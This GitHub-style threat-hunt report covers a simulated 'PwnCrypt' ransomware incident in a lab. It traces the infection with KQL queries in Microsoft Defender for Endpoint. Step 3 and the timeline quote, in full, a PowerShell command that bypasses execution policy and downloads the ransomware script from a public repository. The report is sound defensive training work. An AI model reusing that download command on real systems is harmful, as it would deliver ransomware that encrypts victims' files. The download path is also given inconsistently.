
<p align="center">
  <img src="https://github.com/user-attachments/assets/b7afca87-3ed2-42cd-b8a1-0a0e21d19d15"
</p>

# Threat Hunt Report:  Zero-Day-Ransomware-PwnCrypt-Outbreak
- [Scenario Creation](https://github.com/JordanDanielWest/threat-hunting-scenario-tor/blob/main/threat-hunting-scenario-tor-event-creation.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

##  Scenario

A new ransomware strain named PwnCrypt has been reported in the news, leveraging a PowerShell-based payload to encrypt files on infected systems. The payload, using AES-256 encryption, targets specific directories such as the C:\Users\Public\Desktop, encrypting files and prepending a .pwncrypt extension to the original extension. For example, hello.txt becomes hello.pwncrypt.txt after being targeted with the ransomware. The CISO is concerned with the new ransomware strain being spread to the corporate network and wishes to investigate.

### High-Level Ransomware IoC Discovery Plan

- **Check `DeviceFileEvents`** for any files with `pwncrypt`.
- **Check `DeviceProcessEvents`** to determine delivery method and identify persistent malicious mechanisms.
- **Check `DeviceNetworkEvents`** to identify if there is any communication with a C2 server.
---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

I ran a query in DeviceFileEvents that revealed a file named `pwncrypt.ps1` created at `2025-04-17T20:14:28.4324263Z` confirming that the Pwncrypt Ransomware has infected our corporate network.

Folder Path: `C:\ProgramData\pwncrypt.ps1`

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "edr-machine"
| where FileName has_any ("pwncrypt")
| sort by Timestamp desc
```
![image](https://github.com/user-attachments/assets/03e9c92a-5852-466c-9c6e-19d11492f91d)

---
### 2. Searched the `DeviceFileEvents` Table

I ran a query that revealed several files created with the “pwncrypt” extension.
- Files: `1308_EmployeeRecords_pwncrypt.csv`, `6664_ProjectList_pwncrypt.csv`, `2669_CompanyFinancials_pwncrypt.csv`.


**Query used to locate events:**
```kql
DeviceFileEvents
| where DeviceName == "edr-machine"
| where FileName has_any ("pwncrypt")
| sort by Timestamp desc
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessParentFileName, InitiatingProcessCommandLine
| where ActionType  == "FileCreated"
| where Timestamp >= datetime(2025-04-17T20:14:28.4324263Z)
```
![image](https://github.com/user-attachments/assets/2542925f-a21c-4154-806a-1e40613a3390)
![image](https://github.com/user-attachments/assets/236da8c4-50dd-41db-8d8e-6647e9c8c868)

### 3. Searched the `DeviceProcessEvents` Table

Next, I examined the DeviceProcessEvents table to identify how the files were encrypted. The data revealed evidence of manual execution of `cmd.exe` and `powershell.exe`.
- Additionally, the `InitiatingProcessCommandLine` revealed the script that was run:
  - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
    - The command opens PowerShell and tells it to ignore all safety settings with `ExecutionPolicy Bypass `
    - Then downloads a suspicious script called pwncrypt.ps1 from the internet:`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`
    - And, finally saves it in a system folder:`C:\ProgramData\pwncrypt.ps1`

**Query used to locate event:**

```kql

DeviceProcessEvents
| where DeviceName == "edr-machine"
| where FileName endswith "powershell.exe"
| where ProcessCommandLine contains "pwncrypt.ps1"
| project Timestamp, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessAccountName
| sort by Timestamp desc
```
![image](https://github.com/user-attachments/assets/e50340a2-bed0-42bf-95b4-581d12ea59a4)

---
### 4: Identifying the Executing Account

The initiating process account for the execution of `pwncrypt.ps1` was `SYSTEM`, indicating the script was run with elevated privileges. This suggests it may have been executed via a scheduled task or system-level process. Due to current access limitations, I forwarded my findings to a senior analyst with the appropriate credentials to investigate further.

---

### 5: Checked for Malicious Persistence Mechanisms

I ran a query to determine whether any malicious persistence mechanisms were installed on the system (e.g., via schtasks or sc.exe). The results showed several instances of sc.exe, but all were related to legitimate service starts such as the Windows Time Service. No evidence of malicious scheduled tasks or services was found.

**Query used to locate event:**
```kql
DeviceProcessEvents
| where DeviceName == "edr-machine"
| where ProcessCommandLine has_any ("schtasks", "Schedule", "Task")
| sort by Timestamp desc
```
![image](https://github.com/user-attachments/assets/1eaf3df0-d6be-46c6-9729-9a0b528cb6dd)

---
### 6: Investigated Network Traffic for C2 Communication

I ran a query to check for any suspicious or malicious traffic coming from the target machine that could indicate communication with a Command and Control (C2) server. No suspicious traffic was detected.

**Query used to locate event:**
```kql
DeviceNetworkEvents
| where DeviceName == "edr-machine"
| where RemoteUrl has_any ("pwncrypt", "ransomware", "malicious")
| sort by Timestamp desc
```
---
## Chronological Event Timeline 

### 1. Script Execution - PwnCrypt Script (pwncrypt.ps1)

- **Timestamp:** `2025-04-17T20:14:28.4324263Z`
- **Event:** The `SYSTEM` account executed the `pwncrypt.ps1` script on `edr-machine`, triggering a download from an external source.
- **Action:** `pwncrypt.ps1` downloaded from an external GitHub repository and executed on the machine.
- **File Path:** `C:\Users\Public\Downloads\pwncrypt.ps1`
- **Process Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **Command:** `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`

### 2. File Creation - Encrypted Files (pwncrypt.csv)

- **Timestamp:** `2025-04-17T20:14:32.2519605Z`
- **Event:** The `pwncrypt.ps1` script executed successfully, generating three encrypted files on `edr-machine`.
- **Action:** Files created by the script.
- **File Path:** `C:\Users\Public\Documents\1308_EmployeeRecords_pwncrypt.csv`, `C:\Users\Public\Documents\6664_ProjectList_pwncrypt.csv`, `C:\Users\Public\Documents\2669_CompanyFinancials_pwncrypt.csv`

---

## Summary

At Apr 17, 2025 3:14:28 PM, the system executed a malicious PowerShell script using the `SYSTEM` account. The command bypassed execution policy restrictions and used `Invoke-WebRequest` to download a ransomware payload named `pwncrypt.ps1` from a public GitHub repository, saving it to `C:\programdata\pwncrypt.ps1`. Immediately after, the script was executed, initiating the ransomware behavior. As a result, several files were encrypted and renamed with a `.pwncrypt` extension. Specifically, the files `1308_EmployeeRecords_pwncrypt.csv`, `6664_ProjectList_pwncrypt.csv`, and `2669_CompanyFinancials_pwncrypt.csv` were created. There was no evidence of further command and control communication, data exfiltration, or persistent mechanisms beyond this activity. The attack was contained to local file encryption initiated by the executed script.

---

## Response Taken

Pwncrypt-encrypted files were discovered on the corporate network, prompting an immediate investigation to determine the source and scope of the incident. Analysis of endpoint telemetry revealed a malicious PowerShell command was executed under the `SYSTEM` account on the host `edr-machine`. There was no indication of lateral movement, persistence mechanisms, or communication with an external command and control server. Due to access limitations, the incident was escalated to senior analysts for further review. Remediation actions included isolating the affected system, removing the malicious script, and restoring affected files from backups.


